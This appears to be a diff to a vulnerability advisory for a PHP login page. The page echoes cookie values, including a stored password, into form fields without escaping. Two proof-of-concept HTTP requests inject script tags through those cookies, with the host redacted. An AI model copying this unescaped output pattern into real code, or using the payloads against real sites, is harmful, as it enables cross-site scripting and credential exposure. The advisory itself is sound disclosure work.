@@ -14,6 +14,21 @@
 
 **Affected Code**: 
 > <https://github.com/keerti1924/Secret-Coder-PHP-Project/blob/main/login.php> <br/>
+```php
+<input type="email" class="form-control" id="email" name="email"
+placeholder="Email Address" value="<?php
+if (isset($_COOKIE['emailcookie'])) {
+    echo $_COOKIE['emailcookie'];
+} ?>">
+```
+
+```php
+<input type="password" class="form-control" id="password" name="password"
+placeholder="Password" value="<?php
+if (isset($_COOKIE['passwordcookie'])) {
+    echo $_COOKIE['passwordcookie'];
+} ?>">
+```
 
 **Related CWE:**
 > [CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')](https://cwe.mitre.org/data/definitions/79.html)
@@ -24,7 +39,7 @@
 Option 1:
 ```http 
 GET /login.php HTTP/2
-Host: secret-coder1924.000webhostapp.com
+Host: [REDACTED]
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
 Cookie: emailcookie="><script>alert('reigz')</script>
 ```
@@ -32,7 +47,7 @@ Cookie: emailcookie="><script>alert('reigz')</script>
 Option 2:
 ```http 
 GET /login.php HTTP/2
-Host: secret-coder1924.000webhostapp.com
+Host: [REDACTED]
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
 Cookie: passwordcookie="><script>alert('reigz')</script>
 ```
